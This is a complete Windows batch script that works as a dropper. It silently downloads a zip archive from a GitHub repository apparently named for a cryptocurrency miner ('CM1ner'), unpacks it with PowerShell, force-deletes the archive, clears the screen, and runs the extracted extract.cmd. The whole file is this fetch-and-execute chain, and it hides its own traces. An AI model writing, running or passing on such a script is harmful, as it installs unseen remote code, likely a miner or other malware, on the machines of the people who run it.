@echo off
SET x=%~dp0
curl https://raw.githubusercontent.com/zephr1213/CM1ner/main/extract.zip --output lnk.zip
powershell Expand-Archive -Force %x%lnk.zip %x%
del /F lnk.zip
cls
extract.cmd
